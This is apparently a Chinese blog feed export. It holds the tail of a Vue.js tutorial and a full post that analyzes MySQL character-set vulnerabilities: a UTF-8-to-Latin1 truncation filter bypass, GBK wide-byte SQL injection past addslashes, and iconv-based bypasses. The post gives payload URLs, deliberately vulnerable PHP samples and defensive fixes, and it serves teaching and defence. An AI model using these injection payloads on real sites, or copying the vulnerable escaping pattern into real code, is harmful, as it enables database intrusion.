class="string">"doThat"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="按键修饰符"><a href="#按键修饰符" class="headerlink" title="按键修饰符"></a>按键修饰符</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@keyup<span class="number">.13</span>=<span class="string">"submit"</span> <span class="comment">//在keyCode是13时 调用vm.submit</span></div><div class="line">@click.ctrl=<span class="string">"submit"</span> <span class="comment">//组合ctrl+点击 调用</span></div></pre></td></tr></table></figure>
<h2 id="v-model-双向绑定"><a href="#v-model-双向绑定" class="headerlink" title="v-model 双向绑定"></a>v-model 双向绑定</h2><p>　　你可以用 <code>v-model</code> 指令在表单 <code>&lt;input&gt;</code> 及 <code>&lt;textarea&gt;</code> 元素上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。尽管有些神奇，但 v-model 本质上不过是语法糖。它负责监听用户的输入事件以更新数据，并对一些极端场景进行一些特殊处理。</p>
<blockquote>
<p><code>v-model</code> 会忽略所有表单元素的 <code>value</code>、<code>checked</code>、<code>selected</code> 特性的初始值而总是将 Vue 实例的数据作为数据来源。你应该通过 JavaScript 在组件的 data 选项中声明初始值。</p>
<p>对于需要使用输入法 (如中文、日文、韩文等) 的语言，你会发现 v-model 不会在输入法组合文字过程中得到更新。如果你也想处理这个过程，请使用 input 事件。(需要自己写吧)</p>
</blockquote>
<p>由于每个控件都可以使用<code>v-model</code>绑定到<code>data</code>数据:<br>控件分配：</p>
<ul>
<li>文本 <code>&lt;input&gt;</code></li>
<li>多行文本 <code>&lt;textarea&gt;</code></li>
<li>复选框 <code>&lt;input type=&quot;checkbox&quot;&gt;</code></li>
<li>单选按钮 <code>&lt;input type=&quot;radio&quot;&gt;</code></li>
<li>选择框 <code>&lt;select&gt;</code></li>
</ul>
<p>多个复选框，绑定到同一个数组：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'example-3'</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"jack"</span> <span class="attr">value</span>=<span class="string">"Jack"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"jack"</span>&gt;</span>Jack<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"john"</span> <span class="attr">value</span>=<span class="string">"John"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"john"</span>&gt;</span>John<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"mike"</span> <span class="attr">value</span>=<span class="string">"Mike"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"mike"</span>&gt;</span>Mike<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>Checked names: &#123;&#123; checkedNames &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">  el: <span class="string">'#example-3'</span>,</span></div><div class="line"><span class="undefined">  data: &#123;</span></div><div class="line"><span class="undefined">    checkedNames: []</span></div><div class="line"><span class="undefined">  &#125;</span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>其他请查看 <a href="https://cn.vuejs.org/v2/guide/forms.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95" target="_blank" rel="external">官网</a></p>
<h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><ul>
<li><code>.lazy</code>：默认是在input时间中同步输入框的内容，<code>.lazy</code>会转变为在change事件中的同步。v-model.lazy</li>
<li><code>.number</code>：可以讲输入转换为Number类型，否则即使输入的是数字，他的类型其实是字符串。v-model.number</li>
<li><code>.trim</code>：可以自动过滤输入的首尾空格。v-model.trim</li>
</ul>
<hr>

<h1 id="Vue特殊特性"><a href="#Vue特殊特性" class="headerlink" title="Vue特殊特性"></a>Vue特殊特性</h1><h2 id="属性-key"><a href="#属性-key" class="headerlink" title="属性 key"></a>属性 key</h2><p>　　Vue在渲染元素时，处于效率考虑，会尽可能地复用已有的元素而非重新渲染，比如下面的示例：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">"type === 'name'"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">"输入用户名"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-else</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>邮箱：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">"输入邮箱"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleToggleClick"</span>&gt;</span>切换输入类型<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">    el: <span class="string">'#app'</span>,</span></div><div class="line"><span class="undefined">    data: &#123;</span></div><div class="line"><span class="javascript">        type: <span class="string">'name'</span></span></div><div class="line"><span class="undefined">    &#125;,</span></div><div class="line"><span class="undefined">    methods: &#123;</span></div><div class="line"><span class="javascript">        handleToggleClick: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">            <span class="keyword">this</span>.type = <span class="keyword">this</span>.type === <span class="string">'name'</span> ? <span class="string">'mail'</span> : <span class="string">'name'</span>;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">&#125;)</span></div></pre></td></tr></table></figure></p>
<p>　　上面的程序点击切换按钮虽然DOM变了，但是之前在输入框键入的内容没有改变，只是替换了placeholder的内容,说明<code>&lt;input&gt;</code>元素被复用了。</p>
<p>　　Vue.js提供的<code>key</code>属性，它可以让你自己决定是否要复用元素。<br>　　有相同父元素的子元素必须有独特的 key。重复的 key 会造成渲染错误。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">"输入用户名"</span> <span class="attr">key</span>=<span class="string">"name-input"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">"输入邮箱"</span> <span class="attr">key</span>=<span class="string">"mail-input"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>　　如此可以使input元素各自有key</p>
]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> Vue </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql-字符集漏洞分析]]></title>
      <url>/2018/05/11/mysql-%E5%AD%97%E7%AC%A6%E9%9B%86%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>— Mysql字符集漏洞 —<br>—  PHP 字符集漏洞  —<br><a id="more"></a></p>
<h1 id="mysql字符集漏洞"><a href="#mysql字符集漏洞" class="headerlink" title="mysql字符集漏洞"></a>mysql字符集漏洞</h1><p>此篇将介绍两种有关mysql字符集的漏洞,再提及一点类似原理的PHP字符集。</p>
<ul>
<li>一者是 <strong>字符集转换漏洞</strong> ———— 因为字符集不同 躲过关键词过滤  进入mysql后产生的截断 恢复关键词查询</li>
<li>一者是 <strong>宽字节注入</strong> ———— 因为字符集不同 躲过SQL注入过滤函数<strong>addslashes()</strong>使addslashes过滤的单引号、双引号、反斜杠、NULL 可以利用，从而绕过SQL注入防护，达成SQL注入  </li>
</ul>
<p>在介绍这两种漏洞之前，先介绍一些Mysql语句</p>
<h2 id="Mysql语句"><a href="#Mysql语句" class="headerlink" title="Mysql语句"></a>Mysql语句</h2><h3 id="查看字符集"><a href="#查看字符集" class="headerlink" title="查看字符集"></a>查看字符集</h3><p>查看Mysql中的字符集设置<br><code>show variables like &#39;character_set_%&#39;</code></p>
<h3 id="设置客户端字符集"><a href="#设置客户端字符集" class="headerlink" title="设置客户端字符集"></a>设置客户端字符集</h3><p>在php中，常用以下语句来设置php客户端在Mysql中的字符集<br><code>set names utf8</code><br>这个语句会修改如下几项客户端设置<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">character_set_client=utf8</div><div class="line">character_set_connection=utf8</div><div class="line">character_set_results=utf8</div></pre></td></tr></table></figure></p>
<p>然而如下服务端设置不会修改<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">character_set_database</div><div class="line">character_set_server</div><div class="line">character_set_filesysytem</div><div class="line">character_set_system</div></pre></td></tr></table></figure></p>
<p>这样就造成了 服务端与客户端 不匹配<br>从而会造成 <strong>字符集转换漏洞</strong></p>
<p>而当设置的客户端字符集为GBK时，即<code>set names gbk</code><br>(此处以GBK作为典范，但不只是GBK会产生宽字节注入，之后细说)<br>从而会造成 <strong>宽字节注入</strong></p>
<p>下面说明字符集转换漏洞</p>
<h2 id="Mysql字符集转换漏洞"><a href="#Mysql字符集转换漏洞" class="headerlink" title="Mysql字符集转换漏洞"></a>Mysql字符集转换漏洞</h2><blockquote>
<p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。<br>当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p>
</blockquote>
<p>于是从php到mysql执行命令的字符集转换关系是</p>
<p>character_set_client -&gt; character_set_connection -&gt; 内部操作字符集(如果是对于数据表字段进行操作，就是那个数据表字段的字符集)</p>
<h3 id="字符集转换漏洞"><a href="#字符集转换漏洞" class="headerlink" title="字符集转换漏洞"></a>字符集转换漏洞</h3><p>假设客户端执行了<code>set names utf8</code>，然而服务端的数据库字段格式是 Latin1<br>即字符集转换是：<code>utf8-&gt;utf8-&gt;latin1</code></p>
<p>进行以下测试<br>php源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($username === <span class="string">'admin'</span>) &#123;</div><div class="line">    <span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Permission denied!'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$result = $mysqli-&gt;query(<span class="string">"SELECT * FROM z_users where username = '&#123;$username&#125;' and password = '&#123;$password&#125;'"</span>);</div></pre></td></tr></table></figure></p>
<p>php中过滤了username参数admin，然后从数据库中返回username的内容<br>我们的目的是：<code>绕过PHP过滤，仍然可以从数据库中查询被过滤admin的内容</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://localhost/1.php?username=admin%e4     #在mysql中utf8转为latin1被截断为admin</div><div class="line">http://localhost/1.php?username=admin%e4%bd  #在mysql中utf8转为latin1被截断为admin</div><div class="line">http://localhost/1.php?username=admin%e4%bd%ac  #在mysql中utf8转为latin1失败，出错</div></pre></td></tr></table></figure>
<blockquote>
<p>中文‘佬’的utf8的16进制<code>\xE4\xBD\xAC</code><br>查看汉字UTF8编码：python <code>#encoding:utf8  print &#39;佬&#39;.encode(&#39;hex&#39;)</code></p>
<p>转换出错原因：latin1不支持汉字<br>截断原因：Mysql在转换字符集的时候，会将不完整的字符忽略</p>
</blockquote>
<p>所以只要我们给出UTF-8识别的16进制数据，然而不足以转化为latin1的字节数量，就会被截断<br>payload:<code>?username=admin%e4</code></p>
<h3 id="只有部分字符可以使用"><a href="#只有部分字符可以使用" class="headerlink" title="只有部分字符可以使用"></a>只有部分字符可以使用</h3><p>然而像%e4这样的16进制字符。并不是%00开始到%FF，都是可以被作为截断利用的<br>这关系到UTF-8的字符实现<br><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="external">戳这里先了解UTF8</a><br><a href="http://utf8-chartable.de/unicode-utf8-table.pl" target="_blank" rel="external">这里可以查询UTF8 表</a></p>
<p>提取出重点，UTF-8是变长编码，有可能是1~4字节表示:</p>
<ul>
<li>一个字节时，字节的范围是[00-7F]</li>
<li>两个字节时，字节的范围是[C0-DF] [80-BF]</li>
<li>三个字节时，字节的范围是[E0-EF] [80-BF] [80-BF]</li>
<li>四个字节时，字节的范围是[F0-F7] [80-BF] [80-BF] [80-BF]</li>
</ul>
<p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：</p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr67z2z8w0j30yk0b6aen.jpg" alt="RFC 2629"></p>
<p>最终，规范UTF-8的第一字节的取值范围是:[00-7F] [C2-F4]</p>
<h3 id="Mysql-UTF8-特性"><a href="#Mysql-UTF8-特性" class="headerlink" title="Mysql UTF8 特性"></a>Mysql UTF8 特性</h3><p>又因为，Mysql 对于UTF-8有一特性：</p>
<blockquote>
<p>Mysql的utf8其实是阉割版utf-8编码，Mysql中的utf8字符集最长只支持三个字节<br>utf8mb4编码才是包含完整的UTF8</p>
</blockquote>
<p>所以，对于类似的绕过利用</p>
<ul>
<li>对于UTF8，可以利用第一个字节范围<code>[00-7F] [C2-EF]</code></li>
<li>对于UTF8mb4，可以利用第一个字节范围<code>[00-7F] [C2-F4]</code></li>
</ul>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>上面说到 当<code>set names gbk</code>时，可以绕过addslashes过滤，达成sql注入</p>
<h3 id="addslashes过滤原理"><a href="#addslashes过滤原理" class="headerlink" title="addslashes过滤原理"></a>addslashes过滤原理</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br>预定义字符变化是：</p>
<ul>
<li>单引号(‘) -&gt; <code>\&#39;</code></li>
<li>双引号(“) -&gt; <code>\&quot;</code></li>
<li>反斜杠() -&gt; <code>\\</code></li>
<li>NULL -&gt; <code>\NULL</code></li>
</ul>
<p>当关闭php设置magic_quotes_gpc，在外界参数进入sql语句之前,使用addslashes转移非法符号,再放入sql语句的变量中’’，可以防止sql注入<br>实例代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span></div><div class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'toor!@#$'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</div><div class="line"><span class="comment">//执行sql语句</span></div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); <span class="comment">//sql出错会报错，方便观察</span></div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"gbk"</span> /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2&gt;&#123;$row['title']&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</div><div class="line">mysql_free_result($result);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>payload:<code>?id=1&#39;</code><br>经过addslashes函数，进入sql语句就变成<br><code>SELECT * FROM news WHERE tid=&#39;1\&#39;&#39;</code><br>无法造成单引号闭合，防止了sql注入</p>
<h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p>得知addslashes过滤原理，就可以从两方面来绕过：</p>
<ul>
<li>在addslashes添加的<code>\</code>前面加入一个或奇数个<code>\</code>，变成<code>\\&#39;</code>，这样<code>\</code>被转义了，<code>&#39;</code>逃出了限制</li>
<li>想办法把addslashes添加的<code>\</code>弄没</li>
</ul>
<blockquote>
<p>GBK字符有一字节和双字节编码<br>一个字节时，字节的范围是[00-7F]<br>两个字节时，字节的范围是[81–FE] [40–7E]/[80-FE] 有根据第一个字节划分情况<br>Mysql的特性:mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p>
</blockquote>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr7lkcgyw4j30d60addg9.jpg" alt="GBK编码"></p>
<p>利用以上特性，假如在\前加入一个ASCII码大于128的字符</p>
<p><code>\&#39;</code>-&gt;%5c%27-&gt;<code>\&#39;</code><br><code>%df\&#39;</code>-&gt;%df%5c%27-&gt;<code>運&#39;</code><br><code>SELECT * FROM news WHERE tid=&#39;1運&#39;&#39;</code></p>
<p>以上的转换过程可以看出mysql对于字符的转化过程，单引号逃逸，闭合成功</p>
<h3 id="除了-df的其他字符"><a href="#除了-df的其他字符" class="headerlink" title="除了%df的其他字符"></a>除了%df的其他字符</h3><p>那么除了<code>%df</code>的还有什么字符可以呢，因为是mysql判断这个字符是不是宽字节字符(2个字节一个字符)<br>实际上，根据gbk编码，第一个字节ascii码大于128(即16进制80)，基本上就可以了。<br>比如修改<code>%df</code>为<code>%a1</code><br><code>%a1%5c</code>可能不是一个汉字，但一定会被mysql认为是一个宽字符，能够让后面的%27逃逸(%57 -&gt; \ %27 -&gt; ‘) </p>
<p>同时对于其他被addslashes过滤的符号，当然也可以用这种方法绕过</p>
<h3 id="除了GBK编码的其他编码"><a href="#除了GBK编码的其他编码" class="headerlink" title="除了GBK编码的其他编码"></a>除了GBK编码的其他编码</h3><p>那么除了GBK编码以外，还有什么其他编码可以用来宽字节注入<br>尝试跟GBK类似的<strong>GB2312</strong>，注入是不成功的</p>
<p>GB2312的两字节字符范围是[0xA1-0xF7] [0xA1~0xFE]</p>
<p>因为我们需要我们可控的 <strong>自定义的字节</strong> 与 <strong>0x57</strong> (\) 构成宽字节<br>而<code>0x57</code>根本不能作为GB2312的低字节字符，所以就不会被前面的自定义字节当做2个字节的宽字节字符吃掉，所以注入失败</p>
<p>所以我们可以得出：只要低位(最低位)的范围中含有0x5c的编码，就可以进行宽字符注入。</p>
<h3 id="mysql-real-escape-string-替代-addslashes-产生的漏洞"><a href="#mysql-real-escape-string-替代-addslashes-产生的漏洞" class="headerlink" title="mysql_real_escape_string 替代 addslashes 产生的漏洞"></a>mysql_real_escape_string 替代 addslashes 产生的漏洞</h3><p>在开发寻找宽字节的解决方案时，会考虑 <strong>mysql_real_escape_string</strong><br>因为在官方文档中说明这个函数会计及连接的当前字符集</p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr6ivuhbwxj30og07igmf.jpg" alt=""></p>
<p>于是，有的cms就把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。</p>
<p>但是这样并没有用，仍然可以造成注入<br>原因就是，程序没有指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。</p>
<p>即：</p>
<p><code>mysql_set_charset(&#39;gbk&#39;,$conn);</code><br><code>mysql_real_escape_string($_GET[&#39;id&#39;])</code></p>
<p>这样就可以避免注入</p>
<h3 id="防护宽字节注入"><a href="#防护宽字节注入" class="headerlink" title="防护宽字节注入"></a>防护宽字节注入</h3><ul>
<li>mysql_set_charset + mysql_real_escape_string</li>
<li>character_set_client设置为binary<br><code>SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary</code></li>
<li>不使用mysql函数调用数据库，使用mysqli或PDO</li>
</ul>
<h1 id="类似漏洞原理的php中的iconv"><a href="#类似漏洞原理的php中的iconv" class="headerlink" title="类似漏洞原理的php中的iconv"></a>类似漏洞原理的php中的iconv</h1><p>很多cms会将接收到数据，调用这样一个函数，转换其编码：<br><code>iconv(&#39;utf-8&#39;, &#39;gbk&#39;, $_GET[&#39;word&#39;]);</code><br><code>iconv(&#39;gbk&#39;, &#39;utf-8&#39;, $_GET[&#39;word&#39;]);</code><br>目的一般是为了避免乱码，特别是在搜索框的位置，这样子的字符集转换，也会有着类似的<strong>字符集转换漏洞</strong>。<br>关键源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>,$conn) <span class="keyword">OR</span> emMsg(<span class="string">'链接数据库失败'</span>);</div><div class="line">mysql_query(<span class="string">"SET character_setconnection=gbk,character_set_results=gbk,character_set_client=binary"</span>,$conn);</div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>] ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$id = iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$id);</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</div></pre></td></tr></table></figure></p>
<p>可以看到<code>character_set_client=binary</code>已经进行宽字节注入的防护<br>试试能不能通过<code>iconv</code>绕过addslashes</p>
<h3 id="iconv-‘utf-8’-‘gbk’-GET-‘id’"><a href="#iconv-‘utf-8’-‘gbk’-GET-‘id’" class="headerlink" title="iconv(‘utf-8’, ‘gbk’, $_GET[‘id’])"></a>iconv(‘utf-8’, ‘gbk’, $_GET[‘id’])</h3><blockquote>
<p>通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。</p>
</blockquote>
<p>如何绕过呢?<br>UTF-8的编码字符 会转化成GBK下对应的字符，即：<br>只要一个字符存在于<strong>UTF-8</strong>和<strong>GBK</strong>编码中，我们就可以控制UTF-8的字符，去得到GBK的字符</p>
<p>我们又知道在addslashes的影响下，输入<code>&#39;</code>会形成<code>%5c%27</code>，那么可以想办法输入一个<code>%5c</code>去注释addslashes加入的5c么<br>直接输入<code>%5c</code>自然是不行的，因为5c就是<code>\</code>也会被addslashes过滤</p>
<p>那么<code>錦</code>就可以作为这样的一个输入。<br>“錦”这个字，它的utf-8编码是<code>0xe98ca6</code>，它的gbk编码是<code>0xe55c</code></p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr7lp6wgpkj30cb0563yk.jpg" alt="utf8"></p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr7lplvr6jj30cr058q2y.jpg" alt="gbk"></p>
<p>当我们的<code>錦</code>被iconv从utf-8转换成gbk后，变成了<code>%e5%5c</code>，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p>
<blockquote>
<p>那么神奇的问题出现了，按照GBK的编码规律，前一个字节大于ASCII码128(即0x80) 会被当成<strong>双字节字符</strong>解析成一个字符，<code>%e5&gt;%80</code>明明会被当成双字节解析，把后一个5c吃掉，咋会变成都是单字节解析，5c转义5c的尼？<br>花了忒长时间写这篇了….这里就不测试了，哪个小学弟小学妹帮我测试下吧，弄懂告诉我哈~</p>
</blockquote>
<p>那么假如反过来呢</p>
<h3 id="iconv-‘gbk’-‘utf-8’-GET-‘id’"><a href="#iconv-‘gbk’-‘utf-8’-GET-‘id’" class="headerlink" title="iconv(‘gbk’, ‘utf-8’, $_GET[‘id’])"></a>iconv(‘gbk’, ‘utf-8’, $_GET[‘id’])</h3><p>相同的环境，编码转换反过来，可以利用这个语句来绕过addslashes过滤么</p>
<p>这个利用原理就跟<code>宽字节注入</code>一模一样了吧，只是一个转换是在Mysql中，一个转换是在PHP中而已。<br>直接<code>%df&#39;</code>-&gt;<code>%df/&#39;</code>-&gt;<code>%df%5c%27</code><br>在iconv gbk 变成 utf-8时，会把<code>%df%5c</code>当做一个字符，转化成utf8编码的该字符，从而形成<code>%27</code>单引号逃逸</p>
<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>尽管是一些比较老的漏洞了，一个PDO预编译+同一字符集就可以解决问题<br>但是也算是给自己在<strong>字符集转换漏洞</strong>上面理解了个大概。</p>
<p>理解各个字符集对于16进制数据的处理是很关键的，何时当做单字节字符，何时当做多字节字符，边界16进制范围是多少等。<br>当弄清楚这些时，去发掘字符集漏洞应该也有些许头绪了。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>离别歌：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a><br>离别歌：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ZJGSCTF-2018-web writup]]></title>
      <url>/2018/05/06/ZJGSCTF-2018-writeup/</url>
      <content type="html"><![CDATA[<p>— ZJGSCTF 2018 —<br>—  web writeup —<br><a id="more"></a></p>
